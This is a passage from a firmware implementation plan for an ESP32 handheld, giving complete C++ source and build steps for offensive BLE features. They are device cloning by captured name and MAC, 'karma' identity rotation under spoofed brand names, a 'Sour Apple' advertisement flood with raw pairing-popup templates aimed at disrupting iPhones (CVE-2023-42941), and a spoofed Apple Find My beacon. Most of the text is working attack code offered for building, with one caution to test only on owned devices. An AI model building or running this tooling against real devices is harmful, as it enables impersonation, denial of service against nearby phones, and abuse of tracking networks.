static int gap_scan_event_cb(struct ble_gap_event *event, void *arg) {
    if (event->type != BLE_GAP_EVENT_DISC) return 0;
    if (event->disc.addr.type != BLE_ADDR_RANDOM) return 0; // public addrs unclonable, see file comment

    BleDeviceInfo d{};
    memcpy(d.addr, event->disc.addr.val, 6);
    ble_addr_to_str(d.addr, d.addr_str);
    d.rssi = event->disc.rssi;
    struct ble_hs_adv_fields fields;
    if (ble_hs_adv_parse_fields(&fields, event->disc.data, event->disc.length_data) == 0) {
        if (fields.name != nullptr && fields.name_len > 0) {
            int len = fields.name_len < (int)sizeof(d.name) - 1 ? fields.name_len : (int)sizeof(d.name) - 1;
            memcpy(d.name, fields.name, len);
            d.name[len] = '\0';
        }
    }
    if (d.name[0] == '\0') return 0; // only offer named, identifiable targets to clone

    portENTER_CRITICAL(&s_targets_mux);
    bool dup = false;
    for (int i = 0; i < s_target_count; i++) {
        if (memcmp(s_targets[i].addr, d.addr, 6) == 0) { dup = true; break; }
    }
    if (!dup && s_target_count < kMaxTargets) s_targets[s_target_count++] = d;
    portEXIT_CRITICAL(&s_targets_mux);
    return 0;
}

static void clone_target(int index) {
    portENTER_CRITICAL(&s_targets_mux);
    BleDeviceInfo target = s_targets[index];
    portEXIT_CRITICAL(&s_targets_mux);

    uint8_t clone_addr[6];
    memcpy(clone_addr, target.addr, 6);
    clone_addr[5] |= 0xC0; // force static-random flag bits, same as ble_clone.cpp's donor reasoning

    ble_addr_t addr{};
    addr.type = BLE_ADDR_RANDOM;
    memcpy(addr.val, clone_addr, 6);
    int rc = ble_hs_id_set_rnd(addr.val);
    Serial.printf("quarky-tab5: [ble-clone] ble_hs_id_set_rnd rc=%d\n", rc);

    struct ble_hs_adv_fields fields{};
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
    fields.name = (const uint8_t *)target.name;
    fields.name_len = strlen(target.name);
    fields.name_is_complete = 1;
    ble_gap_adv_set_fields(&fields);

    struct ble_gap_adv_params adv_params{};
    adv_params.conn_mode = BLE_GAP_CONN_MODE_UND; // connectable, matches a real cloned peripheral
    adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
    rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &adv_params, nullptr, nullptr);
    Serial.printf("quarky-tab5: [ble-clone] cloning '%s' rc=%d\n", target.name, rc);
    s_cloning = true;
}

static lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("BLE Clone", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_list = lv_list_create(content);
    lv_obj_set_size(s_list, LV_PCT(100), LV_PCT(100));

    lv_obj_add_event_cb(s_list, [](lv_event_t *e) {
        if (s_scanning) { ble_gap_disc_cancel(); s_scanning = false; }
        if (s_cloning) { ble_gap_adv_stop(); s_cloning = false; }
        s_list = nullptr;
    }, LV_EVENT_DELETE, nullptr);

    if (!c2link_ble_host_synced()) {
        lv_list_add_text(s_list, "BLE host not ready yet, try again shortly");
        return screen;
    }

    s_target_count = 0;
    struct ble_gap_disc_params params{};
    params.passive = 0;
    params.itvl = 0x0050;
    params.window = 0x0030;
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, 10000, &params, gap_scan_event_cb, nullptr);
    Serial.printf("quarky-tab5: [ble-clone] ble_gap_disc rc=%d\n", rc);
    s_scanning = (rc == 0);

    return screen;
}

void register_module() {
    g_registry.register_module({"ble_clone", "BLE Clone", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

void poll() {
    if (!s_scanning || !s_list) return;
    // Refresh the pick-list every 500ms while scanning, same throttle
    // shape as ble_scan.cpp/ble_finder.cpp -- rebuilding kMaxTargets rows
    // is cheap and this list is short-lived (10s scan window).
    static uint32_t last_refresh = 0;
    if (millis() - last_refresh < 500) return;
    last_refresh = millis();

    portENTER_CRITICAL(&s_targets_mux);
    BleDeviceInfo snapshot[kMaxTargets];
    int count = s_target_count;
    memcpy(snapshot, s_targets, sizeof(BleDeviceInfo) * count);
    portEXIT_CRITICAL(&s_targets_mux);

    lv_obj_clean(s_list);
    for (int i = 0; i < count; i++) {
        char row[48];
        snprintf(row, sizeof(row), "%s  %s", snapshot[i].name, snapshot[i].addr_str);
        // Tapping a row clones that target -- index stashed as user_data.
        lv_obj_t *btn = lv_list_add_button(s_list, LV_SYMBOL_COPY, row);
        lv_obj_add_event_cb(btn, [](lv_event_t *e) {
            int idx = (int)(intptr_t)lv_event_get_user_data(e);
            if (s_scanning) { ble_gap_disc_cancel(); s_scanning = false; }
            clone_target(idx);
        }, LV_EVENT_CLICKED, (void *)(intptr_t)i);
    }
}

} // namespace BleCloneFeature
```

- [ ] **Step 2: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 3: Wire registration**

```cpp
// firmware/tab5/src/main.cpp
#include "features/ble/ble_clone.h"
// in setup(): BleCloneFeature::register_module();
// in loop(): BleCloneFeature::poll();
```

- [ ] **Step 4: Real hardware verification**

Flash. Open BLE > BLE Clone near a real random-address BLE peripheral you control (most consumer BLE devices use random addresses by default — a smartwatch, earbuds, etc.). Confirm it appears in the pick-list. Tap it. Confirm (via a second scanning device) that the Tab5 now advertises under the target's captured name and MAC.

- [ ] **Step 5: Commit**

```bash
git add firmware/tab5/src/features/ble/ble_clone.h firmware/tab5/src/features/ble/ble_clone.cpp firmware/tab5/src/main.cpp
git commit -m "Add BLE clone feature (capture + replay a target's advertisement identity)"
```

---

### Task 10: BLE karma

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_karma.h`
- Create: `firmware/tab5/src/features/ble/ble_karma.cpp`

**Interfaces:**
- Consumes: nothing new — proven scan (observer) + advertise (peripheral) mechanisms.
- Produces: nothing consumed by later tasks.

Donor research (2026-08-13, `~/src/poseidon-tab5/src/features/ble_karma.cpp`) found the real implementation is simpler than its name suggests: passive scan running as an "air activity" meter, rotating through a fixed device-name list under a new random MAC every 2 seconds while nearby BLE traffic is present. It does NOT distinguish a targeted scan-request PDU (NimBLE's scan callback doesn't expose that distinction) — this is disclosed here rather than oversold as true per-target karma.

- [ ] **Step 1: Write the feature**

```cpp
// firmware/tab5/src/features/ble/ble_karma.h
#pragma once
namespace BleKarmaFeature {
void register_module();
void start();
void poll();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_karma.cpp
#include "ble_karma.h"
#include "../../hal/c2link_ble.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <host/ble_hs.h>
#include <cstring>

extern FeatureRegistry g_registry;

namespace BleKarmaFeature {

// NOTE, disclosed per donor research: this rotates identity whenever ANY
// nearby BLE advertisement is seen, not specifically in response to a
// scan-request PDU targeted at this device -- NimBLE's scan callback
// doesn't expose that distinction (confirmed against Poseidon's own
// ble_karma.cpp, which has the same limitation despite its file header's
// "listening for incoming scan requests" description). This is "rotate
// identity while nearby BLE traffic exists," not per-target-matched karma.
static const char *kNames[] = {
    "AirPods Pro", "AirPods Max", "Galaxy Buds Pro", "Galaxy Buds2",
    "Samsung TV", "Sony WH-1000XM4", "JBL Flip 6", "Beats Fit Pro",
    "Pixel Buds Pro", "Bose QC45", "LG TV", "Echo Dot",
    "Fitbit Charge 5", "Garmin Watch", "MX Master 3", "Magic Mouse",
};
static constexpr int kNameCount = sizeof(kNames) / sizeof(kNames[0]);

static volatile bool s_traffic_seen = false;
static bool s_active = false;
static int s_name_idx = 0;
static uint32_t s_last_rotate_ms = 0;
static lv_obj_t *s_status_label = nullptr;

static int gap_scan_event_cb(struct ble_gap_event *event, void *arg) {
    if (event->type == BLE_GAP_EVENT_DISC) s_traffic_seen = true;
    return 0;
}

static void rotate_identity() {
    uint8_t addr[6];
    for (int i = 0; i < 6; i++) addr[i] = (uint8_t)esp_random();
    addr[5] |= 0xC0;
    ble_hs_id_set_rnd(addr);

    ble_gap_adv_stop();
    struct ble_hs_adv_fields fields{};
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
    const char *name = kNames[s_name_idx];
    fields.name = (const uint8_t *)name;
    fields.name_len = strlen(name);
    fields.name_is_complete = 1;
    ble_gap_adv_set_fields(&fields);

    struct ble_gap_adv_params adv_params{};
    adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
    adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
    int rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &adv_params, nullptr, nullptr);
    Serial.printf("quarky-tab5: [ble-karma] advertising as '%s' rc=%d\n", name, rc);

    s_name_idx = (s_name_idx + 1) % kNameCount;
}

static lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("BLE Karma", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Starting...");

    lv_obj_add_event_cb(s_status_label, [](lv_event_t *e) {
        ble_gap_disc_cancel();
        ble_gap_adv_stop();
        s_active = false;
        s_status_label = nullptr;
    }, LV_EVENT_DELETE, nullptr);

    if (!c2link_ble_host_synced()) {
        lv_label_set_text(s_status_label, "BLE host not ready yet, try again shortly");
        return screen;
    }

    struct ble_gap_disc_params params{};
    params.passive = 1;
    params.itvl = 0x0050;
    params.window = 0x0030;
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, BLE_HS_FOREVER, &params, gap_scan_event_cb, nullptr);
    Serial.printf("quarky-tab5: [ble-karma] ble_gap_disc rc=%d\n", rc);
    s_active = (rc == 0);
    s_name_idx = 0;
    s_last_rotate_ms = 0;

    return screen;
}

void register_module() {
    g_registry.register_module({"ble_karma", "BLE Karma", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

void poll() {
    if (!s_active) return;
    if (!s_traffic_seen) return;
    uint32_t now = millis();
    if (now - s_last_rotate_ms < 2000) return;
    rotate_identity();
    s_traffic_seen = false;
    s_last_rotate_ms = now;
    if (s_status_label) {
        char buf[48];
        snprintf(buf, sizeof(buf), "Rotating identity (%s next)", kNames[s_name_idx]);
        lv_label_set_text(s_status_label, buf);
    }
}

} // namespace BleKarmaFeature
```

- [ ] **Step 2: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 3: Wire registration**

```cpp
// firmware/tab5/src/main.cpp
#include "features/ble/ble_karma.h"
// in setup(): BleKarmaFeature::register_module();
// in loop(): BleKarmaFeature::poll();
```

- [ ] **Step 4: Real hardware verification**

Flash. Open BLE > BLE Karma in an area with some ambient BLE traffic (any populated room). Confirm the status label shows identity rotation happening every ~2s (via a second scanning device, confirm the broadcast name and MAC actually change on schedule).

- [ ] **Step 5: Commit**

```bash
git add firmware/tab5/src/features/ble/ble_karma.h firmware/tab5/src/features/ble/ble_karma.cpp firmware/tab5/src/main.cpp
git commit -m "Add BLE karma feature (identity rotation while nearby traffic present)"
```

---

### Task 11: Sour Apple (CVE-2023-42941)

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_sourapple.h`
- Create: `firmware/tab5/src/features/ble/ble_sourapple.cpp`

**Interfaces:**
- Consumes: nothing new — proven advertise mechanism.
- Produces: nothing consumed by later tasks.

Donor research (2026-08-13, `~/src/poseidon-tab5/src/features/ble_sourapple.cpp`) confirmed pure advertisement flood, non-connectable, 7 rotating templates via direct `ble_gap_adv_set_data()` (bypassing the wrapper that rejects Apple mfr-ID packets, same escape hatch Task 8 above uses for Fast Pair).

- [ ] **Step 1: Write the feature**

```cpp
// firmware/tab5/src/features/ble/ble_sourapple.h
#pragma once
namespace BleSourAppleFeature {
void register_module();
void start();
void poll();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_sourapple.cpp
#include "ble_sourapple.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <host/ble_hs.h>
#include <esp_random.h>

extern FeatureRegistry g_registry;

namespace BleSourAppleFeature {

// 7 real, verified templates from donor research (2026-08-13,
// ~/src/poseidon-tab5/src/features/ble_sourapple.cpp), each a complete raw
// AD-structure sequence (flags + one or more mfg/service-data structures)
// ready for ble_gap_adv_set_data(). Rotated one per send_one(), same 200ms
// cadence pattern ble_spam.cpp established.
static const uint8_t kTemplates[][31] = {
    // 0: Apple ProximityPair "new AirPods" popup (same shape as ble_spam.cpp's AirPods payload)
    {0x02,0x01,0x06, 0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x00,0xC6,0x00,0x00,0x00,0x00,
     0x45,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    // 1: Apple Nearby Action modal (subtype 0x0F)
    {0x02,0x01,0x06, 0x0F,0xFF,0x4C,0x00,0x0F,0x05,0xC1,0x00,0x00,0x00,0x00,0x00,0x00},
    // 2: Apple AirTag popup (subtype 0x12, borrowing the Find My AD shape)
    {0x02,0x01,0x06, 0x17,0xFF,0x4C,0x00,0x12,0x19,0x00,
     0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x00,0x00},
    // 3: Samsung EasySetup Buds/Watch
    {0x02,0x01,0x06, 0x06,0xFF,0x75,0x00,0x01,0x00,0x00},
    // 4: MS Swift Pair (subtype bytes 03 00 80 + name)
    {0x02,0x01,0x06, 0x0A,0xFF,0x06,0x00,0x03,0x00,0x80,'i','P','h','o','n','e'},
    // 5: Google Fast Pair (service-data shape, same as ble_spam.cpp's kFastPairPayload)
    {0x02,0x01,0x06, 0x03,0x03,0x2C,0xFE, 0x06,0x16,0x2C,0xFE,0x37,0x11,0xEA,0x02,0x0A,0xC3},
    // 6: Apple ProximityPair, alternate device-model subtype
    {0x02,0x01,0x06, 0x1E,0xFF,0x4C,0x00,0x07,0x19,0x0E,0x20,0x01,0x00,0x00,0x00,0x00,
     0x45,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
};
static const uint8_t kTemplateLens[] = {29, 16, 27, 10, 16, 17, 29};
static constexpr int kTemplateCount = sizeof(kTemplateLens) / sizeof(kTemplateLens[0]);

static bool s_active = false;
static int s_next_template = 0;
static uint32_t s_last_send_ms = 0;
static lv_obj_t *s_status_label = nullptr;

static void randomize_own_mac() {
    uint8_t addr[6];
    for (int i = 0; i < 6; i++) addr[i] = (uint8_t)esp_random();
    addr[5] |= 0xC0;
    ble_hs_id_set_rnd(addr);
}

static void send_one() {
    randomize_own_mac();
    ble_gap_adv_stop();

    int rc = ble_gap_adv_set_data(kTemplates[s_next_template], kTemplateLens[s_next_template]);
    if (rc != 0) {
        Serial.printf("quarky-tab5: [ble-sourapple] adv_set_data rc=%d (template %d)\n", rc, s_next_template);
    } else {
        struct ble_gap_adv_params adv_params{};
        adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
        adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
        rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &adv_params, nullptr, nullptr);
        if (rc != 0) Serial.printf("quarky-tab5: [ble-sourapple] adv_start rc=%d\n", rc);
    }
    s_next_template = (s_next_template + 1) % kTemplateCount;
}

static lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("Sour Apple (CVE-2023-42941)", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Flooding...");

    lv_obj_add_event_cb(s_status_label, [](lv_event_t *e) {
        s_active = false;
        s_status_label = nullptr;
        int rc = ble_gap_adv_stop();
        Serial.printf("quarky-tab5: [ble-sourapple] ble_gap_adv_stop rc=%d\n", rc);
    }, LV_EVENT_DELETE, nullptr);

    s_active = true;
    s_next_template = 0;
    s_last_send_ms = 0;
    return screen;
}

void register_module() {
    g_registry.register_module({"ble_sourapple", "Sour Apple", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

void poll() {
    if (!s_active) return;
    uint32_t now = millis();
    if (now - s_last_send_ms < 200) return;
    send_one();
    s_last_send_ms = now;
}

} // namespace BleSourAppleFeature
```

- [ ] **Step 2: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 3: Wire registration**

```cpp
// firmware/tab5/src/main.cpp
#include "features/ble/ble_sourapple.h"
// in setup(): BleSourAppleFeature::register_module();
// in loop(): BleSourAppleFeature::poll();
```

- [ ] **Step 4: Real hardware verification**

Flash. Open BLE > Sour Apple near a real iOS device (your own — this can visibly disrupt its Bluetooth UI, that's the point of the CVE, only test against equipment you own). Confirm via serial log that all 7 templates send without `adv_set_data`/`adv_start` errors. Observe the target device's Bluetooth behavior (CVE-2023-42941's public writeups describe Bluetooth UI slowdown/crash under sustained exposure — confirm or refute against your own patched/unpatched test device and report the real observed result either way, since Apple has patched this in current iOS).

- [ ] **Step 5: Commit**

```bash
git add firmware/tab5/src/features/ble/ble_sourapple.h firmware/tab5/src/features/ble/ble_sourapple.cpp firmware/tab5/src/main.cpp
git commit -m "Add Sour Apple (CVE-2023-42941) BLE advertisement-flood feature"
```

---

### Task 12: Find My emulator

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_findmy.h`
- Create: `firmware/tab5/src/features/ble/ble_findmy.cpp`

**Interfaces:**
- Consumes: nothing new — proven advertise mechanism.
- Produces: nothing consumed by later tasks.

Donor research (2026-08-13, `~/src/poseidon-tab5/src/features/ble_findmy.cpp`) confirmed advertisement-only, non-connectable, real 31-byte Apple offline-finding AD structure with a random stand-in public key (iPhones relay it blindly without validating).

- [ ] **Step 1: Write the feature**

```cpp
// firmware/tab5/src/features/ble/ble_findmy.h
#pragma once
namespace BleFindMyFeature {
void register_module();
void start();
void poll();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_findmy.cpp
#include "ble_findmy.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <host/ble_hs.h>
#include <esp_random.h>

extern FeatureRegistry g_registry;

namespace BleFindMyFeature {

// Real 31-byte Apple offline-finding advertisement shape, from donor
// research (2026-08-13, ~/src/poseidon-tab5/src/features/ble_findmy.cpp):
// [0x1E, 0xFF, 0x4C, 0x00, 0x12, 0x19, status, key[22], hint_byte, 0x00].
// key[22] stands in for a real rotating Curve25519 public key -- iPhones
// don't validate it, they relay blindly, which is the whole point of the
// offline-finding network's design (and the reason this "works" without a
// real Apple account/key infrastructure).
static void build_advert(uint8_t out[31]) {
    out[0] = 0x1E; out[1] = 0xFF; out[2] = 0x4C; out[3] = 0x00; out[4] = 0x12; out[5] = 0x19;
    out[6] = 0x00; // status byte
    for (int i = 0; i < 22; i++) out[7 + i] = (uint8_t)esp_random();
    out[29] = 0x00; // hint byte
    out[30] = 0x00;
}

static bool s_active = false;
static uint32_t s_last_rotate_ms = 0;
static uint32_t s_dwell_ms = 60000; // 60s "single tag" default, per donor
static lv_obj_t *s_status_label = nullptr;

static void rotate() {
    uint8_t addr[6];
    for (int i = 0; i < 6; i++) addr[i] = (uint8_t)esp_random();
    addr[5] |= 0xC0;
    ble_hs_id_set_rnd(addr);

    uint8_t advert[31];
    build_advert(advert);

    ble_gap_adv_stop();
    int rc = ble_gap_adv_set_data(advert, sizeof(advert));
    if (rc == 0) {
        struct ble_gap_adv_params adv_params{};
        adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
        adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
        rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &adv_params, nullptr, nullptr);
    }
    Serial.printf("quarky-tab5: [ble-findmy] rotate rc=%d\n", rc);
}

static lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("Find My Emulator", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Broadcasting...");

    lv_obj_add_event_cb(s_status_label, [](lv_event_t *e) {
        s_active = false;
        s_status_label = nullptr;
        int rc = ble_gap_adv_stop();
        Serial.printf("quarky-tab5: [ble-findmy] ble_gap_adv_stop rc=%d\n", rc);
    }, LV_EVENT_DELETE, nullptr);

    s_active = true;
    s_last_rotate_ms = 0; // force immediate first rotate in poll()
    return screen;
}

void register_module() {
    g_registry.register_module({"ble_findmy", "Find My Emulator", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

void poll() {
    if (!s_active) return;
    uint32_t now = millis();
    if (now - s_last_rotate_ms < s_dwell_ms) return;
    rotate();
    s_last_rotate_ms = now;
}

} // namespace BleFindMyFeature
```

- [ ] **Step 2: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 3: Wire registration**

```cpp
// firmware/tab5/src/main.cpp
#include "features/ble/ble_findmy.h"
// in setup(): BleFindMyFeature::register_module();
// in loop(): BleFindMyFeature::poll();
```

- [ ] **Step 4: Real hardware verification**

Flash. Trigger the feature. Confirm via serial log and an independent scanner that the advertisement broadcasts with the correct AD structure (company ID `0x004C`, type `0x12`) at the expected ~60s rotation cadence. Full "does it actually show up in a real Find My network map" confirmation requires an Apple device signed into iCloud with Find My active nearby for an extended period (Apple's offline-finding relay has real-world latency); note in the report whether this end-to-end confirmation was performed or deferred.

- [ ] **Step 5: Commit**

```bash
git add firmware/tab5/src/features/ble/ble_findmy.h firmware/tab5/src/features/ble/ble_findmy.cpp firmware/tab5/src/main.cpp
git commit -m "Add Find My emulator BLE advertisement feature"
```

---

## Tasks 13-18: contingent on Task 1 (BLE central/client-connect spike) or Task 2 (BLE HID spike)

Do not dispatch any task below until the relevant spike's real hardware result is known. If Task 1 fails, Tasks 13, 14, 16, 17, 18 need the project owner's re-scoping decision, same process as the first plan's Task 2 → Task 4 relationship. If Task 2 fails, Task 15 needs the same treatment.

### Task 13: GATT explorer (contingent on Task 1)

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_gatt_explorer.h`
- Create: `firmware/tab5/src/features/ble/ble_gatt_explorer.cpp`

**Interfaces:**
- Consumes: `BleCentral::connect()`/`disconnect()` (Task 1), `BleDeviceInfo`/scan mechanism (first plan's Task 7).
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Write the feature -- connect to a scanned target, enumerate services then characteristics per service**

```cpp
// firmware/tab5/src/features/ble/ble_gatt_explorer.h
#pragma once
namespace BleGattExplorerFeature {
void register_module();
void start();
void poll();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_gatt_explorer.cpp
#include "ble_gatt_explorer.h"
#include "ble_central.h"
#include "ble_common.h"
#include "../../hal/c2link_ble.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <host/ble_gattc.h>
#include <host/ble_hs.h>
#include <cstring>

extern FeatureRegistry g_registry;

namespace BleGattExplorerFeature {

static constexpr int kMaxTargets = 16;
static BleDeviceInfo s_targets[kMaxTargets];
static int s_target_count = 0;
static portMUX_TYPE s_targets_mux = portMUX_INITIALIZER_UNLOCKED;
static lv_obj_t *s_list = nullptr;
static bool s_scanning = false;
static uint16_t s_conn_handle = BLE_HS_CONN_HANDLE_NONE;

static int chr_disc_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                        const struct ble_gatt_chr *chr, void *arg) {
    if (error->status == 0 && chr != nullptr && s_list) {
        char uuid_str[BLE_UUID_STR_LEN];
        ble_uuid_to_str(&chr->uuid.u, uuid_str);
        char row[64];
        snprintf(row, sizeof(row), "  chr %s (handle %u)", uuid_str, chr->val_handle);
        lv_list_add_text(s_list, row);
    }
    return 0;
}

static int svc_disc_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                        const struct ble_gatt_svc *service, void *arg) {
    if (error->status == 0 && service != nullptr && s_list) {
        char uuid_str[BLE_UUID_STR_LEN];
        ble_uuid_to_str(&service->uuid.u, uuid_str);
        char row[64];
        snprintf(row, sizeof(row), "svc %s", uuid_str);
        lv_list_add_text(s_list, row);
        ble_gattc_disc_all_chrs(conn_handle, service->start_handle, service->end_handle, chr_disc_cb, nullptr);
    } else if (error->status == BLE_HS_EDONE && s_list) {
        lv_list_add_text(s_list, "-- discovery complete --");
    }
    return 0;
}

static int gap_event_cb(struct ble_gap_event *event, void *arg) {
    switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            s_conn_handle = event->connect.conn_handle;
            if (s_list) lv_list_add_text(s_list, "-- connected, discovering --");
            ble_gattc_disc_all_svcs(s_conn_handle, svc_disc_cb, nullptr);
        } else if (s_list) {
            char row[32];
            snprintf(row, sizeof(row), "connect failed status=%d", event->connect.status);
            lv_list_add_text(s_list, row);
        }
        return 0;
    case BLE_GAP_EVENT_DISCONNECT:
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
        return 0;
    default:
        return 0;
    }
}

static int gap_scan_event_cb(struct ble_gap_event *event, void *arg) {
    if (event->type != BLE_GAP_EVENT_DISC) return 0;
    BleDeviceInfo d{};
    memcpy(d.addr, event->disc.addr.val, 6);
    ble_addr_to_str(d.addr, d.addr_str);
    d.rssi = event->disc.rssi;
    struct ble_hs_adv_fields fields;
    if (ble_hs_adv_parse_fields(&fields, event->disc.data, event->disc.length_data) == 0) {
        if (fields.name != nullptr && fields.name_len > 0) {
            int len = fields.name_len < (int)sizeof(d.name) - 1 ? fields.name_len : (int)sizeof(d.name) - 1;
            memcpy(d.name, fields.name, len);
            d.name[len] = '\0';
        }
    }
    portENTER_CRITICAL(&s_targets_mux);
    bool dup = false;
    for (int i = 0; i < s_target_count; i++) if (memcmp(s_targets[i].addr, d.addr, 6) == 0) { dup = true; break; }
    if (!dup && s_target_count < kMaxTargets) s_targets[s_target_count++] = d;
    portEXIT_CRITICAL(&s_targets_mux);
    return 0;
}

static void connect_to(int index) {
    portENTER_CRITICAL(&s_targets_mux);
    ble_addr_t target{};
    target.type = BLE_ADDR_PUBLIC;
    memcpy(target.val, s_targets[index].addr, 6);
    portEXIT_CRITICAL(&s_targets_mux);
    if (s_list) lv_obj_clean(s_list);
    BleCentral::connect(target, 5000, gap_event_cb, nullptr);
}

static lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("GATT Explorer", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_list = lv_list_create(content);
    lv_obj_set_size(s_list, LV_PCT(100), LV_PCT(100));

    lv_obj_add_event_cb(s_list, [](lv_event_t *e) {
        if (s_scanning) { ble_gap_disc_cancel(); s_scanning = false; }
        if (s_conn_handle != BLE_HS_CONN_HANDLE_NONE) BleCentral::disconnect(s_conn_handle);
        s_list = nullptr;
    }, LV_EVENT_DELETE, nullptr);

    if (!c2link_ble_host_synced()) {
        lv_list_add_text(s_list, "BLE host not ready yet, try again shortly");
        return screen;
    }

    s_target_count = 0;
    struct ble_gap_disc_params params{};
    params.passive = 0;
    params.itvl = 0x0050;
    params.window = 0x0030;
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, 10000, &params, gap_scan_event_cb, nullptr);
    Serial.printf("quarky-tab5: [gatt-explorer] ble_gap_disc rc=%d\n", rc);
    s_scanning = (rc == 0);
    return screen;
}

void register_module() {
    g_registry.register_module({"ble_gatt_explorer", "GATT Explorer", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

void poll() {
    if (!s_scanning || !s_list) return;
    static uint32_t last_refresh = 0;
    if (millis() - last_refresh < 500) return;
    last_refresh = millis();

    portENTER_CRITICAL(&s_targets_mux);
    BleDeviceInfo snapshot[kMaxTargets];
    int count = s_target_count;
    memcpy(snapshot, s_targets, sizeof(BleDeviceInfo) * count);
    portEXIT_CRITICAL(&s_targets_mux);

    lv_obj_clean(s_list);
    for (int i = 0; i < count; i++) {
        char row[48];
        const char *label = snapshot[i].name[0] ? snapshot[i].name : snapshot[i].addr_str;
        snprintf(row, sizeof(row), "%s  %ddBm", label, snapshot[i].rssi);
        lv_obj_t *btn = lv_list_add_button(s_list, LV_SYMBOL_BLUETOOTH, row);
        lv_obj_add_event_cb(btn, [](lv_event_t *e) {
            int idx = (int)(intptr_t)lv_event_get_user_data(e);
            if (s_scanning) { ble_gap_disc_cancel(); s_scanning = false; }
            connect_to(idx);
        }, LV_EVENT_CLICKED, (void *)(intptr_t)i);
    }
}

} // namespace BleGattExplorerFeature
```

- [ ] **Step 2: Compile.** Run: `cd firmware/tab5 && pio run` — Expected: SUCCESS.
- [ ] **Step 3: Wire registration** (same pattern as every task above; `#include`, `register_module()` in `setup()`, `poll()` in `loop()`).
- [ ] **Step 4: Real hardware verification.** Flash. Scan, tap a real target, confirm real services/characteristics enumerate on screen matching what a reference tool (nRF Connect) shows for the same device.
- [ ] **Step 5: Commit.**

```bash
git add firmware/tab5/src/features/ble/ble_gatt_explorer.h firmware/tab5/src/features/ble/ble_gatt_explorer.cpp firmware/tab5/src/main.cpp
git commit -m "Add GATT explorer feature (contingent on Task 1's central-connect spike)"
```
